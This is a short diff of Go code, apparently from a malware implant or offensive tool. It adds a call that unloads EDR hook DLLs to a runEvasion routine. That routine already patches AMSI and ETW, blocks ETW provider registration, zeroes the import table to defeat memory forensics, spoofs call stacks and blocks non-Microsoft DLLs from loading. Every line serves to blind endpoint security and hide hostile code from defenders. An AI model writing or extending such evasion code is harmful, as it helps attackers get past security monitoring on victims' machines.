@@ -14,6 +14,7 @@ func runEvasion() {
 	patchAMSI()
 	patchETW()
 	patchEtwRegister() // block future ETW provider registrations
+	unloadEDRDLLs()   // remove already-loaded EDR hook DLLs (must precede blockNonMicrosoftDLLs)
 	iatStomp()         // zero IAT so memory dumps reveal no imports
 	initSpoofing()     // pre-alloc MEM_IMAGE fake stack before ACG blocks new allocs
 	blockNonMicrosoftDLLs() // prevent EDR DLL injection
